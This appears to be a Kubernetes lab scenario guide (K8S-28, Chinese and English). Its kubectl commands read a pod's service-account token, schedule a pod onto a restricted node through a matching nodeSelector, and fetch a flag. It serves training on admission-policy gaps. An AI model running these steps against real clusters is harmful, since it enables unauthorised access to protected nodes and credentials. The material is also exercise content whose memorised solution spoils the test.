# K8S-28: Node Selector Evasion

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-28 |
| 名称 | Node Selector Evasion |
| 技术/CVE | N/A (scheduling bypass) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-28-node-evasion |

## 场景概述

```
Attacker tenant (attacker-ns, limited RBAC) → Discover restricted node with
  security=restricted label → Create pod in own tenant with matching
  nodeSelector → Pod schedules on restricted node → Access flag via ClusterIP Service
```

> 语义说明：nodeSelector 是调度机制，不是安全边界。该场景的“漏洞”是平台缺少
> 准入策略（Gatekeeper/Kyverno/PSA）来限制租户将工作负载调度到受保护节点；
> 攻击者本身只能在自己的 namespace（attacker-ns）内创建 pod。

## 前置知识

### Knowledge
- Kubernetes scheduling: Understanding nodeSelector and how it constrains pod placement
- Node labels: Knowing that kubectl describe node shows labels, and kubectl get nodes --show-labels displays them
- Pod-to-Service communication: Using wget/curl from inside a pod to access a Service by ClusterIP

### Tools
- kubectl: K8s API interaction (get nodes, run pods, exec, describe)

## 利用步骤

### Step 1: Discover Node Labels
```bash
kubectl get nodes --show-labels
# Note: worker node has label security=restricted
```

### Step 2: Create Pod with Matching nodeSelector
```bash
# Use the attacker SA token (RBAC is limited to attacker-ns)
TOKEN=$(kubectl exec -n attacker-ns attacker-pod -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN run evader --image=alpine:latest -n attacker-ns \
  --overrides='{"spec":{"nodeSelector":{"security":"restricted"}}}' \
  -- sleep 3600
```

### Step 3: Wait for Pod and Access Flag
```bash
kubectl --token=$TOKEN wait --for=condition=Ready pod/evader -n attacker-ns --timeout=30s
FLAG_IP=$(kubectl get svc flag-svc -n secure-ns -o jsonpath='{.spec.clusterIP}')
kubectl --token=$TOKEN exec evader -n attacker-ns -- wget -qO- http://${FLAG_IP}:8080
```

## 验证命令

```bash
kubectl cluster-info --context kind-cve-k8s-28-node-evasion
kubectl get nodes --show-labels
```

## Flag

- `/flag.txt` in the `flag-holder` pod running on the restricted node

- Flag 位置：`/flag.txt` in flag-holder pod on restricted node

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Kubernetes scheduler, node selectors, and labels |
| 侦察与前置条件 | Scheduling constraints and mutable node/pod selector fields |
| 核心漏洞与利用 | Evade a restrictive node selector |
| 权限、横向或影响 | Workload placement on a protected node |
| 验证 | Verify access to the target node's flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
